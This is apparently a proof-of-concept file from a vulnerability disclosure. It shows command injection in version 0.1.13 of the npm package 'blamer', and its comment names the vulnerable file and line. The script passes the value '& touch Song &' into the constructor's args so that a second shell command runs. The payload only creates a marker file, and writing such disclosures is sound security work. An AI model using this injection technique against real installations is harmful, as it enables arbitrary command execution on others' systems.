/**
 * version "0.1.13" of blamer is vulnerable to command injection.
 * 
 * The injection point is located in line 24 of file "src/vcs/git.js" inside the 
 * default function of this file, which is called by the function "blameByFile" 
 * inside the file "src/Blamer.js". This function is exported by the index and can
 * be used directly by the users. 
 * The second argument "args" of the vulnerable function
 * can be controlled by users without any sanitization. 
 */

var Root = require("blamer");
var attack_command = "& touch Song &";
root = new Root('git',attack_command);
root.blameByFile("./");
